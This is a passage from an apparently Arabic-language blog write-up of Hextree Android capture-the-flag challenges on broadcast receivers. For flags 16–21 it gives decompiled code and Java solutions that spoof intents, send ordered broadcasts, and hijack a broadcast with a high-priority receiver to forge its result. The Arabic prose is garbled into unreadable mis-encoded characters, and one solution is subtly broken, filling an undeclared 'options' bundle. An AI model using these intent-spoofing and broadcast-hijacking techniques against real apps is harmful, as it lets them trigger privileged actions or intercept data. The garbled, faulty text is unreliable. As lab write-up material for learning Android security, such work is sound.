(intent.getStringExtra(\u0026#34;flag\u0026#34;).equals(FlagSecret)) { success(context, FlagSecret); } } ŸáŸÜÿß ÿßŸÑŸÄ broadcast ÿßŸÑŸÑŸä ŸáŸÜÿ®ÿπÿ™Ÿá ŸÑÿßÿ≤ŸÖ ŸäŸÉŸàŸÜ ŸÅŸäŸá flag ÿ®ÿßŸÑŸÇŸäŸÖÿ© give-flag-16 ÿπÿ¥ÿßŸÜ ÿßŸÑŸÄ method success ÿ™ÿ¥ÿ™ÿ∫ŸÑ.\nÿßŸÑÿ≠ŸÑ # Intent intent = new Intent(); intent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.receivers.Flag16Receiver\u0026#34;); intent.putExtra(\u0026#34;flag\u0026#34;,\u0026#34;give-flag-16\u0026#34;); sendBroadcast(intent); Ÿàÿ£ŸäŸàÿ© ÿ®ÿ≥ ŸÉÿØÿ©.\nFlag 17 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public static String FlagSecret = \u0026#34;give-flag-17\u0026#34;; public void onReceive(Context context, Intent intent) { Log.i(\u0026#34;Flag17Receiver.onReceive\u0026#34;, Utils.dumpIntent(context, intent)); if (isOrderedBroadcast()) { if (intent.getStringExtra(\u0026#34;flag\u0026#34;).equals(FlagSecret)) { success(context, FlagSecret); return; } Bundle bundle = new Bundle(); bundle.putBoolean(\u0026#34;success\u0026#34;, false); setResult(0, \u0026#34;Flag 17 Completed\u0026#34;, bundle); } } ÿßŸÑŸÖŸàÿ∂Ÿàÿπ ÿ≤Ÿä ÿßŸÑŸÑŸä ŸÅÿßÿ™ ÿ®ÿ≥ ŸÖÿ≠ÿ™ÿßÿ¨ŸäŸÜ ŸÜÿ®ÿπÿ™Ÿá ŸÉŸÄ ordered broadcast ÿü\nNon-ordered vs. Ordered Broadcasts # ŸÅŸä ÿßŸÑŸÄ non-ordered modeÿå ÿßŸÑŸÄ broadcasts ÿ®ÿ™ÿ™ÿ®ÿπÿ™ ŸÑŸÉŸÑ ÿßŸÑŸÄ receivers ÿßŸÑŸÖŸáÿ™ŸÖÿ© \u0026ldquo;ŸÅŸä ŸÜŸÅÿ≥ ÿßŸÑŸàŸÇÿ™\u0026rdquo;. ŸäÿπŸÜŸä ŸÖÿßŸÅŸäÿ¥ receiver ŸäŸÇÿØÿ± Ÿäÿ™ÿØÿÆŸÑ ÿ£Ÿà ŸäŸÖŸÜÿπ ÿ∫Ÿäÿ±Ÿá ŸÖŸÜ ÿßŸÑÿ¥ÿ∫ŸÑ. ŸÖÿ´ÿßŸÑ ÿπŸÑŸâ ŸÉÿØŸá ÿßŸÑŸÄ ACTION_BATTERY_LOW.\nŸÅŸä ÿßŸÑŸÄ ordered modeÿå ÿßŸÑŸÄ broadcasts ÿ®ÿ™ÿ™ÿ®ÿπÿ™ ŸÑŸÉŸÑ receiver ÿ®ÿßŸÑÿ™ÿ±ÿ™Ÿäÿ® (ÿ≠ÿ≥ÿ® ÿßŸÑŸÄ android:priority attribute ŸÑŸÑŸÄ intent-filter element ŸÅŸä ÿßŸÑŸÄ manifest file) ŸàŸÖŸÖŸÉŸÜ receiver ŸäŸàŸÇŸÅ ÿßŸÑŸÄ broadcast ŸÅÿßŸÑŸÄ receivers ÿßŸÑŸÑŸä ÿ£ŸàŸÑŸàŸäÿ™Ÿáÿß ÿ£ŸÇŸÑ ŸÖÿ¥ Ÿáÿ™ÿßÿÆÿØŸá (ŸÖÿ¥ Ÿáÿ™ÿ¥ÿ™ÿ∫ŸÑ ÿÆÿßŸÑÿµ). ŸÖÿ´ÿßŸÑ ÿπŸÑŸâ ÿßŸÑŸÜŸàÿπ ÿØŸá ÿßŸÑŸÄ ACTION_NEW_OUTGOING_CALL.\nÿßŸÑÿ≠ŸÑ # Intent intent = new Intent(); intent.putExtra(\u0026#34;flag\u0026#34;,\u0026#34;give-flag-17\u0026#34;); intent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.receivers.Flag17Receiver\u0026#34;); sendOrderedBroadcast(intent, null); Flag 18 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public static String SECRET_FLAG = \u0026#34;giving-out-flags\u0026#34;; public void onCreate(Bundle bundle) { Intent intent = new Intent(\u0026#34;io.hextree.broadcast.FREE_FLAG\u0026#34;); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); intent.addFlags(8); sendOrderedBroadcast(intent, null, new BroadcastReceiver() { @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent2) { String resultData = getResultData(); Bundle resultExtras = getResultExtras(false); int resultCode = getResultCode(); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultData \u0026#34; + resultData); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultExtras \u0026#34; + resultExtras); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultCode \u0026#34; + resultCode); if (resultCode != 0) { Utils.showIntentDialog(context, \u0026#34;BroadcastReceiver.onReceive\u0026#34;, intent2); Flag18Activity flag18Activity = Flag18Activity.this; flag18Activity.success(flag18Activity); } } }, null, 0, null, null); ÿßŸÑŸÄ activity ÿØŸá ŸáŸäÿ®ÿπÿ™ ordered broadcast ÿ®ÿßŸÑŸÄ action \u0026quot;io.hextree.broadcast.FREE_FLAG\u0026quot; ŸàŸäÿ≥ÿ™ŸÜŸâ ÿ±ÿØÿå ŸàŸÑŸÖÿß Ÿäÿ¨ŸäŸÑŸá ÿßŸÑŸÜÿ™Ÿäÿ¨ÿ©ÿå ÿ±ŸÇŸÖ ÿßÿ≥ŸÖŸá resultCode ÿ®Ÿäÿ™ÿ¥ŸäŸÉ ŸÑŸà ŸÖÿ¥ ÿµŸÅÿ±ÿå ŸÑŸà ÿµÿ≠ ŸÅ ŸáŸÜÿ¨Ÿäÿ® ÿßŸÑÿπŸÑŸÖ\nÿßŸÑÿ≠ŸÑ # ŸäÿπŸÜŸä ŸÖÿ≠ÿ™ÿßÿ¨ŸäŸÜ ŸÜÿπŸÖŸÑ receiver ÿ®ÿßŸÑŸÄ filter ÿßŸÑÿµÿ≠ ŸàŸÜÿπŸÖŸÑ setResultCode Ÿäÿß ÿ•ŸÖÿß ok ÿ£Ÿà ŸÜÿ≠ÿ∑ ÿ±ŸÇŸÖ.\nBroadcastReceiver hijacker = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { setResultCode(Activity.RESULT_OK); setResultData(\u0026#34;Intercepted!\u0026#34;); } }; IntentFilter filter = new IntentFilter(\u0026#34;io.hextree.broadcast.FREE_FLAG\u0026#34;); filter.setPriority(999); // ÿπÿ¥ÿßŸÜ ŸÜŸÉŸàŸÜ ÿ£ŸàŸÑ Ÿàÿßÿ≠ÿØ ŸäÿßÿÆÿ∞ ÿßŸÑÿ®ÿ´ ŸÑŸà ŸÅŸäŸá ÿ™ÿ∑ÿ®ŸäŸÇÿßÿ™ ÿ´ÿßŸÜŸäÿ© registerReceiver(hijacker, filter, null, null); ÿ£Ÿà ŸÜÿπŸÖŸÑ receiver ŸÅŸä ÿ≥ÿ∑ÿ± Ÿàÿßÿ≠ÿØ ÿ®ÿ≥:\nregisterReceiver(hijacker, new IntentFilter(\u0026#34;io.hextree.broadcast.FREE_FLAG\u0026#34;)); Flag 19 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public void onReceive(Context context, Intent intent) { Bundle bundleExtra; String action = intent.getAction(); if (action == null || !action.contains(\u0026#34;APPWIDGET_UPDATE\u0026#34;) || (bundleExtra = intent.getBundleExtra(\u0026#34;appWidgetOptions\u0026#34;)) == null) { return; } int i = bundleExtra.getInt(\u0026#34;appWidgetMaxHeight\u0026#34;, -1); int i2 = bundleExtra.getInt(\u0026#34;appWidgetMinHeight\u0026#34;, -1); if (i == 1094795585 \u0026amp;\u0026amp; i2 == 322376503) { success(context); } } ŸáŸÜÿß ÿßŸÑŸÄ widget ÿ®ŸäÿßÿÆÿØ intent ŸÖŸÜ broadcast ŸàŸäÿ¥ŸäŸÉ ŸÑŸà ŸÅŸä action APPWIDGET_UPDATE ŸàŸÖÿπÿßŸá Extra data: i = 1094795585 \u0026amp; i2 = 322376503\nÿßŸÑÿ≠ŸÑ # ŸäÿπŸÜŸä ŸáŸÜÿπŸÖŸÑ ŸÖÿ™ÿ∫Ÿäÿ± ŸÖŸÜ ŸÜŸàÿπ Bundle ŸàŸÜÿØŸäŸÑŸá ÿßŸÑŸÄ data ŸàŸÜÿ≠ÿ∑ ÿßŸÑŸÄ action ÿßŸÑÿµÿ≠:\nIntent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.receivers.Flag19Widget\u0026#34; )); Bundle bundle = new Bundle(); options.putInt(\u0026#34;appWidgetMaxHeight\u0026#34;, 1094795585); options.putInt(\u0026#34;appWidgetMinHeight\u0026#34;, 322376503); intent.putExtra(\u0026#34;appWidgetOptions\u0026#34;, bundle); intent.setAction(\u0026#34;APPWIDGET_UPDATE\u0026#34;); sendBroadcast(intent); Flag 20 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # public static String GET_FLAG = \u0026#34;io.hextree.broadcast.GET_FLAG\u0026#34;; public void onCreate(Bundle bundle) { if (intent == null) { return; } Intent intent = getIntent(); String action = intent.getAction(); if (action != null \u0026amp;\u0026amp; action.equals(GET_FLAG)) { success(this); return; } Flag20Receiver flag20Receiver = new Flag20Receiver(); IntentFilter intentFilter = new IntentFilter(GET_FLAG); registerReceiver(flag20Receiver, intentFilter); } ÿØŸá ÿ®Ÿäÿ≥ÿ¨ŸÑ receiver ŸÑŸÑŸÄ io.hextree.broadcast.GET_FLAG action ŸàŸÑŸÖÿß Ÿäÿ¨ŸäŸÑŸá intent ŸÖÿ¥ ŸÅÿßÿ∂Ÿä ÿ®ÿßŸÑŸÄ action ÿØŸá ŸáŸÜŸÇÿØÿ± ŸÜÿ¨Ÿäÿ® ÿßŸÑŸÄ Flag.\nÿßŸÑÿ≠ŸÑ # Intent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.broadcast.GET_FLAG\u0026#34;); intent.putExtra(\u0026#34;give-flag\u0026#34;, true); // ÿ£Ÿä data sendBroadcast(intent); Flag 21 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # ÿ¨ÿ≤ÿ° ÿßŸÑŸÄ Notification:\n// ÿ•ŸÜÿ¥ÿßÿ° ŸÇŸÜÿßÿ© ÿ•ÿ¥ÿπÿßÿ±ÿßÿ™ private void createNotificationChannel() { // ÿßŸÑÿ•ÿ¥ÿπÿßÿ±ÿßÿ™ ŸÑÿßÿ≤ŸÖ ÿ™ŸÉŸàŸÜ ŸÑŸáÿß ŸÇŸÜÿßÿ© ÿ≤Ÿä ŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™ŸÑŸÅÿ≤ŸäŸàŸÜ NotificationChannel notificationChannel = new NotificationChannel( \u0026#34;CHANNEL_ID\u0026#34;, // ŸÖÿπÿ±ŸÅ ÿßŸÑŸÇŸÜÿßÿ© \u0026#34;Hextree Notifications\u0026#34;, // ÿßÿ≥ŸÖ Ÿäÿ¥ŸàŸÅŸá ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ NotificationManager.IMPORTANCE_DEFAULT // ŸÖÿ≥ÿ™ŸàŸâ ÿßŸÑÿ£ŸáŸÖŸäÿ© (Ÿäÿ£ÿ´ÿ± ÿπŸÑŸâ ÿßŸÑÿµŸàÿ™ ŸàÿßŸÑÿ∏ŸáŸàÿ±) ); notificationChannel.setDescription(\u0026#34;ÿ•ÿ¥ÿπÿßÿ±ÿßÿ™ ÿ™ÿ™ÿπŸÑŸÇ ÿ®ÿÆÿµÿßÿ¶ÿµ ÿßŸÑÿ£ŸÖÿßŸÜ.\u0026#34;); // ÿ•ŸÜÿ¥ÿßÿ° ÿßŸÑŸÇŸÜÿßÿ© ŸÅÿπŸÑŸäŸãÿß NotificationManager manager = getSystemService(NotificationManager.class); manager.createNotificationChannel(notificationChannel); } // ŸÅŸä onCreate(): // ÿ•ŸÜÿ¥ÿßÿ° Ÿàÿ•ÿ∏Ÿáÿßÿ± ÿ•ÿ¥ÿπÿßÿ± ŸÖÿπ ÿ≤ÿ± ÿ£ŸÉÿ¥ŸÜ createNotificationChannel(); // ÿ™ÿ≠ÿ∂Ÿäÿ± ÿ•ŸÜÿ™ŸÜÿ™ ÿßŸÑÿ®ÿ´ (ÿ≤Ÿä ÿ™ÿ≠ÿ∂Ÿäÿ± ÿ±ÿ≥ÿßŸÑÿ© ŸÑŸÑÿ•ÿ±ÿ≥ÿßŸÑ) Intent intent = new Intent(GIVE_FLAG); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); // ÿ•ÿ∂ÿßŸÅÿ© ÿ®ŸäÿßŸÜÿßÿ™ ÿ•ÿ∂ÿßŸÅŸäÿ© (ÿßŸÑÿπŸÑŸÖ) // ŸÑŸÅ ÿßŸÑÿ•ŸÜÿ™ŸÜÿ™ ŸÅŸä PendingIntent (Ÿäÿ≥ŸÖÿ≠ ÿ®ÿßŸÑÿ™ŸÜŸÅŸäÿ∞ ŸÅŸä ÿßŸÑÿÆŸÑŸÅŸäÿ©) PendingIntent pendingIntent = PendingIntent.getBroadcast( this, 0, // ŸÉŸàÿØ ÿßŸÑÿ∑ŸÑÿ® (ŸÖÿß Ÿäÿ≥ÿ™ÿÆÿØŸÖ ŸáŸÜÿß) intent, PendingIntent.FLAG_IMMUTABLE // ÿπŸÑŸÖ ÿ£ŸÖÿßŸÜ (ŸÖÿ∑ŸÑŸàÿ® ŸÑÿ£ŸÜÿØÿ±ŸàŸäÿØ 12+) ); // ÿ®ŸÜÿßÿ° ÿßŸÑÿ•ÿ¥ÿπÿßÿ± NotificationCompat.Builder notification = new NotificationCompat.Builder(this, \u0026#34;CHANNEL_ID\u0026#34;) .setSmallIcon(R.drawable.hextree_logo) // ÿ£ŸäŸÇŸàŸÜÿ© ÿµÿ∫Ÿäÿ±ÿ© ŸÅŸä ÿ¥ÿ±Ÿäÿ∑ ÿßŸÑÿ≠ÿßŸÑÿ© .setContentTitle(this.name) // ÿπŸÜŸàÿßŸÜ ÿßŸÑÿ•ÿ¥ÿπÿßÿ± .setContentText(\u0026#34;Reverse engineer classes Flag21Activity\u0026#34;) // ÿßŸÑŸàÿµŸÅ .setPriority(NotificationCompat.PRIORITY_DEFAULT) // ŸÖÿ≥ÿ™ŸàŸâ ÿßŸÑÿ£ŸàŸÑŸàŸäÿ© .setAutoCancel(true) // ŸäÿÆÿ™ŸÅŸä ŸÑŸÖÿß ŸÜÿ∂ÿ∫ÿ∑ ÿπŸÑŸäŸá .addAction( // ÿ•ÿ∂ÿßŸÅÿ© ÿ≤ÿ± ŸÑŸÑÿ•ÿ¥ÿπÿßÿ± R.drawable.hextree_logo, // ÿ£ŸäŸÇŸàŸÜÿ© ÿßŸÑÿ≤ÿ± \u0026#34;Give Flag\u0026#34;, // ŸÜÿµ ÿßŸÑÿ≤ÿ± pendingIntent // ÿ•Ÿäÿ¥ ŸäÿµŸäÿ± ŸÑŸÖÿß ŸÜÿ∂ÿ∫ÿ∑ (Ÿäÿ±ÿ≥ŸÑ ÿ®ÿ´) ); // ÿ¥ŸäŸÉ ÿπŸÑŸâ ÿßŸÑÿ•ÿ∞ŸÜ Ÿàÿ•ÿ∏Ÿáÿßÿ± ÿßŸÑÿ•ÿ¥ÿπÿßÿ± if (ActivityCompat.checkSelfPermission(this, \u0026#34;android.permission.POST_NOTIFICATIONS\u0026#34;) != 0) { NotificationManagerCompat.from(this).notify(1, notification.build()); Toast.makeText(this, \u0026#34;ÿ¥ŸäŸÉ ÿπŸÑŸâ ÿßŸÑÿ•ÿ¥ÿπÿßÿ±ÿßÿ™ ÿ®ÿ™ÿßÿπÿ™ŸÉ\u0026#34;, 0).show(); } ÿßŸÑŸÄ notification ŸÅŸäŸáÿß ÿ≤ÿ±ÿßÿ± ŸÑŸÖÿß ŸÜÿ∂ÿ∫ÿ∑ ÿπŸÑŸäŸá ÿ®ŸäÿπŸÖŸÑ broadcast. ÿßŸÑŸÄ broadcast ÿØŸá ŸÅŸäŸá \u0026ldquo;flag\u0026rdquo; ŸÖÿÆŸÅŸä Ÿà ÿßŸÑŸÄ receiver (ÿßŸÑÿ¨ÿ≤ÿ° ÿßŸÑÿ™ÿßŸÜŸä) ÿ®ŸäŸÖÿ≥ŸÉ ÿßŸÑŸÄ broadcast ÿØŸá ŸàŸäÿ¥ÿ™ÿ∫ŸÑ ÿπŸÑŸäŸá. Android 13 Ÿà ŸÖÿß ŸÅŸàŸÇ ŸÖÿ≠ÿ™ÿßÿ¨ ÿ•ÿ∞ŸÜ ÿµÿ±Ÿäÿ≠ ŸÑŸÄ notifications ÿπÿ¥ÿßŸÜ ÿ™ÿ¥ÿ™ÿ∫ŸÑ.\nÿ¨ÿ≤ÿ° ÿßŸÑŸÄ Receiver:\n//Flag21Activity.class // Broadcast Receiver implementation private BroadcastReceiver broadcastReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Get broadcast results String resultData = getResultData(); Bundle resultExtras = getResultExtras(false); int resultCode = getResultCode(); // Log the results Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultData \u0026#34; + resultData); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultExtras \u0026#34; + resultExtras); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultCode \u0026#34; + resultCode); // Show toast and handle success Toast.makeText(context, \u0026#34;Check the broadcast intent for the flag\u0026#34;, 0).show(); Flag21Activity flag21Activity = Flag21Activity.this; flag21Activity.success(null, flag21Activity); } }; // In onCreate(): // Register the broadcast receiver this.f.addTag(GIVE_FLAG); IntentFilter intentFilter = new IntentFilter(GIVE_FLAG); registerReceiver(broadcastReceiver, intentFilter); ÿßŸÑŸÄ receiver ŸÖÿ≥ÿ™ŸÜŸä broadcast ÿ®ÿßŸÑŸÄ action GIVE_FLAG. ŸÑŸÖÿß ŸäŸàÿµŸÑŸáÿå ÿ®ŸäÿπŸÖŸÑ log ŸÑŸÑŸÄ data ŸàŸäÿ∏Ÿáÿ± Toast Ÿàÿ®ÿπÿØŸäŸÜ ÿßŸÑŸÄ success ÿ®ÿ™ÿ¥ÿ™ÿ∫ŸÑ.\nÿßŸÑÿ≠ŸÑ # ÿ®ÿπÿØ ŸÖÿß ŸÜÿ∂ÿ∫ÿ∑ ÿπŸÑŸâ ÿßŸÑŸÄ activity ÿπÿ¥ÿßŸÜ ŸÜŸÜÿ¥ÿ¶ ÿßŸÑŸÄ notificationÿå ÿπŸÖŸÑÿ™ ŸÜŸÅÿ≥ ÿßŸÑŸÑŸä ÿßŸÑÿ≤ÿ±ÿßÿ± ŸÅŸä ÿßŸÑŸÄ notification ÿßŸÑŸÖŸÅÿ±Ÿàÿ∂ Ÿäÿ®ÿπÿ™Ÿá ŸàÿÆŸÑÿßÿµ:\nIntent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.broadcast.GIVE_FLAG\u0026#34;); sendBroadcast(intent); ","date":"14 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/ctf/mobile/hex/hex_broadcast/","section":"Posts","summary":"","title":"HEX Tree Broadcast ÿ™ÿ≠ÿØŸäÿßÿ™","type":"posts"},{"content":"","externalUrl":null,"permalink":"/superBLog/ar/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/superBLog/ar/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/superBLog/ar/series/","section":"Series","summary":"","title":"Series","type":"series"}]